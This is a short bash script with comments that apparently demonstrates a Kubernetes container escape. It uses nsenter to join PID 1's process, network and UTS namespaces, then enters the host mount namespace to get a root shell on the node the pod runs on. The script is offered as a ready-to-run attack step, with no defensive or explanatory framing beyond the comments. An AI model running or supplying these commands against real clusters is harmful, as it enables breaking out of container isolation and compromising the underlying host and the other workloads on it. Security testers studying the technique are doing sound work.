#!/bin/bash

# nsenter allows you to run in a different linux namespace
# Here you run in the namespace of the pid 1, the network namespace and the user namespace
nsenter -t 1 -p -n -u
# mounting to trigger a shell from the node the pod is running on
nsenter --mount=/proc/1/ns/mnt /bin/bash